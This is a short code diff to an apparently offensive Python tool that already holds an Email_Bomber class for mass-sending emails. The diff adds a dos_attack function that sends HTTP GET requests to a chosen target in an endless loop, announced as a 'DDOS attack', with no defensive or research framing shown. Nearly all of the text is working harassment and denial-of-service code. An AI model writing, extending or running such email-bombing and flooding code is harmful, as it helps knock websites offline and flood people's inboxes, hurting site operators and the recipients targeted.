@@ -137,6 +137,14 @@ class Email_Bomber:
         for _ in range(self.amount + 1):
             self.send()
         self.s.close()
+def dos_attack(target):
+    print(f"Starting DDOS attack on {target}...")
+    while True:
+        try:
+            res = requests.get(target)
+            print("Request sent!")
+        except requests.exceptions.ConnectionError:
+            print("[ERROR] Connection error!")
 
 # Main Menu
 def display_ui():
